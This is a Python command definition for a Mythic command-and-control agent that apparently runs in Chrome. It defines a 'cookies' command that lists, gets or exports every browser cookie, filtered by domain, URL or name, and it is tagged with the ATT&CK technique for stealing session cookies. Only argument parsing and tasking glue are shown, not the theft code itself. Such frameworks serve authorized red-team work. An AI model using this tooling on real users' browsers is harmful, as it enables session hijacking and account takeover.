from mythic_container.MythicCommandBase import *

from .tasking import wired_tasking


class CookiesArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                choices=["list", "get", "export"],
                default_value="list",
                description="Cookie action",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            ),
            CommandParameter(
                name="domain",
                type=ParameterType.String,
                description="Domain filter",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
            CommandParameter(
                name="url",
                type=ParameterType.String,
                description="URL for get or filter",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
            CommandParameter(
                name="name",
                type=ParameterType.String,
                description="Cookie name",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
            ),
            CommandParameter(
                name="format",
                type=ParameterType.ChooseOne,
                choices=["json", "netscape"],
                default_value="json",
                description="Export format",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=5)],
            ),
        ]

    async def parse_arguments(self):
        if not self.command_line:
            return
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
            return
        pieces = self.command_line.split()
        self.add_arg("action", pieces[0])
        if len(pieces) > 1:
            self.add_arg("domain", pieces[1])

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class CookiesCommand(CommandBase):
    cmd = "cookies"
    needs_admin = False
    help_cmd = "cookies"
    description = "Dump every cookie in every store. Optional domain/url/name filter. JSON or Netscape."
    version = 1
    author = "@PatchRequest"
    attackmapping = ["T1539"]
    argument_class = CookiesArguments
    attributes = CommandAttributes(builtin=True, supported_os=[SupportedOS.Chrome])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        display = taskData.args.get_arg("action") or "list"
        if taskData.args.get_arg("domain"):
            display += f" {taskData.args.get_arg('domain')}"
        return wired_tasking(taskData, display)

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
